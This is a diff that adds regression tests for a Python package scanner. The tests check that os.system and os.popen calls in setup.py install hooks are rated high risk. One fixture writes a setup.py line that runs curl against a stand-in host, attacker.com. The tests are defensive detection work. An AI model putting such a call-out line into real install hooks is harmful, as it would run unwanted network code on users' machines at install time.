@@ -149,6 +149,31 @@ class TestScanPythonFileHigh:
         findings = scan_python_file(str(setup), is_hook=True)
         assert any(f.level == RiskLevel.HIGH for f in findings)
 
+    def test_os_system_in_hook_is_high(self, tmp_path):
+        """Regression: os.system() in setup.py must be HIGH (no shell=True kwarg)."""
+        setup = tmp_path / "setup.py"
+        setup.write_text('import os\nos.system("curl http://attacker.com")\n')
+        findings = scan_python_file(str(setup), is_hook=True)
+        assert any(f.level == RiskLevel.HIGH for f in findings), (
+            "os.system() in install hook must produce HIGH finding"
+        )
+
+    def test_os_popen_in_hook_is_high(self, tmp_path):
+        """Regression: os.popen() in setup.py must be HIGH."""
+        setup = tmp_path / "setup.py"
+        setup.write_text('import os\nresult = os.popen("id").read()\n')
+        findings = scan_python_file(str(setup), is_hook=True)
+        assert any(f.level == RiskLevel.HIGH for f in findings), (
+            "os.popen() in install hook must produce HIGH finding"
+        )
+
+    def test_os_system_in_runtime_is_not_high(self, tmp_path):
+        """os.system() in runtime code must NOT produce HIGH (only hooks are HIGH)."""
+        mod = tmp_path / "runner.py"
+        mod.write_text('import os\nos.system("ls")\n')
+        findings = scan_python_file(str(mod), is_hook=False)
+        assert not any(f.level == RiskLevel.HIGH for f in findings)
+
 
 # ── Python file scanning: MEDIUM paths ──────────────────────────────────────
 
